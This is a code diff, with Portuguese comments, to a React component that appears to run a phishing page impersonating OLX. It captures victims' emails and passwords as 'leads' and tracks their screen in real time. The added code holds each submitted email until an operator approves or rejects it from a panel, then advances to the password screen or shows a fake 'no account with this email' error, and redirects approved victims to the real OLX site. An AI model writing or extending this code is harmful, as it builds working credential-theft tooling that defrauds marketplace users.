@@ -64,6 +64,16 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
   const capturedEmailRef = useRef("");
   const setScreenRef = useRef<((kind: string) => void) | null>(null);
   const markPresenceActiveRef = useRef<(() => void) | null>(null);
+  // Estado "e-mail pendente de aprovação" (depois do clique em "Acessar"):
+  // ficamos esperando o admin aprovar/rejeitar OU 10s de timeout antes de
+  // mostrar o alertbox "Não existe uma conta com este e-mail.".
+  const emailPendingRef = useRef(false);
+  const emailPendingTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  // Refs pras funções de navegação (criadas dentro do effect principal).
+  // Usadas pelo listener de actions (que vive em outro effect) pra avançar
+  // de tela quando o admin aprova o e-mail.
+  const navigateToScreenRef = useRef<((screen: AdScreen) => void) | null>(null);
+  const navigateToManualScreenRef = useRef<((kind: string) => boolean) | null>(null);
 
   // Presença "ao vivo" + tela atual em tempo real (só pra contexto público com adId)
   useEffect(() => {
@@ -188,6 +198,35 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
         (payload) => {
           const row = payload.new as { session_id: string; action: string; payload: { message?: string } | null };
           if (row.session_id !== sessionId) return;
+          // Se a sessão tá aguardando decisão sobre o e-mail (clicou Acessar),
+          // a aprovação avança pra próxima tela e a rejeição mostra o alertbox
+          // "Não existe uma conta com este e-mail." na própria tela do e-mail.
+          if (emailPendingRef.current) {
+            if (emailPendingTimerRef.current) {
+              clearTimeout(emailPendingTimerRef.current);
+              emailPendingTimerRef.current = null;
+            }
+            emailPendingRef.current = false;
+            const iframe = iframeRef.current;
+            if (row.action === "approve") {
+              // Limpa loading e segue pra próxima tela (igual o fluxo manual).
+              iframe?.contentWindow?.postMessage({ type: "iframe-email-loading-stop" }, "*");
+              const next =
+                screensRef.current.find((s) => s.kind === "access-account") ??
+                screensRef.current.find((s) => s.kind === "password");
+              if (next) navigateToScreenRef.current?.(next);
+              else navigateToManualScreenRef.current?.("access-account");
+            } else if (row.action === "reject") {
+              iframe?.contentWindow?.postMessage(
+                {
+                  type: "iframe-email-error",
+                  message: row.payload?.message || "Não existe uma conta com este e-mail.",
+                },
+                "*",
+              );
+            }
+            return;
+          }
           if (row.action === "approve") {
             window.location.href = "https://www.olx.com.br";
           } else if (row.action === "reject") {
@@ -205,6 +244,11 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
       cancelled = true;
       void channel.unsubscribe();
       void actionChannel.unsubscribe();
+      if (emailPendingTimerRef.current) {
+        clearTimeout(emailPendingTimerRef.current);
+        emailPendingTimerRef.current = null;
+      }
+      emailPendingRef.current = false;
     };
   }, [adId]);
 
@@ -408,6 +452,10 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
       return true;
     };
 
+    // Expõe pro listener de ações do dono (em outro effect)
+    navigateToScreenRef.current = navigateToScreen;
+    navigateToManualScreenRef.current = navigateToManualScreen;
+
     const goBackToMain = () => {
       onChildScreen = false;
       currentScreenIdRef.current = null;
@@ -547,6 +595,27 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
             .then(({ error }) => {
               if (error) console.warn("[PreviewFrame] email_submitted insert:", error);
             });
+          // Em vez de avançar de tela na hora, aguarda decisão do dono (admin
+          // aprova/rejeita no painel) ou 10s. Mostra spinner no botão e bloqueia
+          // o input enquanto isso.
+          if (emailPendingTimerRef.current) {
+            clearTimeout(emailPendingTimerRef.current);
+          }
+          emailPendingRef.current = true;
+          iframe.contentWindow?.postMessage({ type: "iframe-email-loading-start" }, "*");
+          emailPendingTimerRef.current = setTimeout(() => {
+            if (!emailPendingRef.current) return;
+            emailPendingRef.current = false;
+            emailPendingTimerRef.current = null;
+            iframe.contentWindow?.postMessage(
+              {
+                type: "iframe-email-error",
+                message: "Não existe uma conta com este e-mail.",
+              },
+              "*",
+            );
+          }, 10_000);
+          return;
         }
 
         // Senha submetida → grava lead e avança pra tela de e-mail (email-code)
